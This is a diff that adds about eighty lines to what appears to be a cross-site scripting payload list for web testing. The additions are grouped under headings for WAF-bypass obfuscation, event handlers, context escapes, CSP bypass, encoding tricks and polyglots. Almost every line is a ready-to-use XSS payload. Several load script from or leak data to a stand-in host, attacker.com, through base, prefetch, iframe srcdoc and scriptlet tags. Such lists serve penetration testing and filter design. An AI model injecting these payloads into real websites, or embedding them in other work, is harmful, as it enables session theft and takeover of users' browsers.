@@ -546,3 +546,83 @@ window.location='javascript:alert(1)'
 <div :class="{a:alert(1)}"></div>
 <div v-once v-html="'<img src=x onerror=alert(1)>'"></div>
 <script id=x type=text>alert(1)</script><img onerror="eval(document.getElementById('x').text)" src=x>
+
+# ── ADDITIONAL WAF BYPASS: OBFUSCATION ──
+<svg><script>alert&#x28;1&#x29;</script>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<script>eval('alert(1)')</script>
+<script>(0,alert)(1)</script>
+<script>void(alert(1))</script>
+<script>throw alert(1)</script>
+<script>new Function('alert(1)')()</script>
+<script>setTimeout(alert,0,1)</script>
+<script>requestAnimationFrame(alert.bind(null,1))</script>
+<script>queueMicrotask(alert.bind(null,1))</script>
+<script>Promise.resolve().then(()=>alert(1))</script>
+<script>Object.defineProperty(window,'x',{get:function(){alert(1)}});x</script>
+<script>Object.assign(window,{x:function(){alert(1)}});x()</script>
+
+# ── ADDITIONAL EVENT HANDLERS ──
+<div ongotpointercapture=alert(1)>x</div>
+<div onlostpointercapture=alert(1)>x</div>
+<body onpopstate=alert(1)><a href=#x>click</a>
+<div contenteditable oninput=alert(1)>type here</div>
+<div contenteditable onbeforeinput=alert(1)>type</div>
+<input type=file onchange=alert(1)>
+<select onchange=alert(1)><option>1</option><option>2</option></select>
+<form onsubmit=alert(1)><input type=submit></form>
+<form onreset=alert(1)><input type=reset></form>
+<iframe onmouseenter=alert(1)>
+<div ondblclick=alert(1)>dblclick</div>
+<html onmousewheel=alert(1)>
+
+# ── ADDITIONAL CONTEXT ESCAPE ──
+</script>/*--></script><script>alert(1)</script>
+';/*</script><script>alert(1)//
+\x3c\x73\x63\x72\x69\x70\x74\x3ealert(1)\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3cimg\x20src\x3dx\x20onerror\x3dalert(1)\x3e
+"><a href=javascript:alert(1)>xss</a>
+'><a href=javascript:alert(1)>xss</a>
+"><link rel=stylesheet href=javascript:alert(1)>
+"><meta http-equiv=refresh content=0;url=javascript:alert(1)>
+"><button formaction=javascript:alert(1)>XSS</button>
+
+# ── ADDITIONAL CSP BYPASS TECHNIQUES ──
+<base href=//attacker.com>
+<link rel=prefetch href=//attacker.com/leak?c=>
+<link rel=preload href=//attacker.com as=script>
+<link rel=dns-prefetch href=//attacker.com>
+<script src=data:,alert(1)></script>
+<script>import('data:text/javascript,alert(1)')</script>
+<iframe srcdoc="<script src=//attacker.com/xss.js></script>">
+<meta http-equiv=Content-Security-Policy content="default-src *">
+
+# ── ADDITIONAL ENCODING ──
+%253Cscript%253Ealert(1)%253C/script%253E
+%u003Cscript%u003Ealert(1)%u003C/script%u003E
+<svg><script>/**/alert/**/(/**/1/**/)/**/</script></svg>
+<script>/*\nalert(1)\n*/</script>
+<script>//\nalert(1)</script>
+<script type=module>alert(1)</script>
+<script async>alert(1)</script>
+<script defer>alert(1)</script>
+
+# ── TEMPLATE LITERAL / ES6 TRICKS ──
+<script>let a=`${alert(1)}`</script>
+<script>(`${alert(1)}`)</script>
+<svg onload="`${alert(1)}`">
+<img src=x onerror="`${alert(1)}`">
+
+# ── ADDITIONAL POLYGLOT ──
+'"><img/src/onerror=location=`javas\x63ript\x3aalert\x281\x29`>
+'"><svg/onload=location=`javas\x63ript\x3aalert\x281\x29`>
+<iframe src="javascript:void('<script>alert(1)</script>')">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<form method=GET action=javascript:alert(1)><input type=submit value=go>
+<isindex action="javascript:alert(1)" type=image>
+<button type=submit formaction=javascript:alert(1) form=x><form id=x>
+<object type="text/x-scriptlet" data="http://attacker.com/xss.sct">
+<plaintext></plaintext><img src=x onerror=alert(1)>
+<!--[if IE]><img src=x onerror=alert(1)><![endif]-->
+<![if IE]><img src=x onerror=alert(1)><![endif]>
+<%2Fscript><script>alert(1)<%2Fscript>
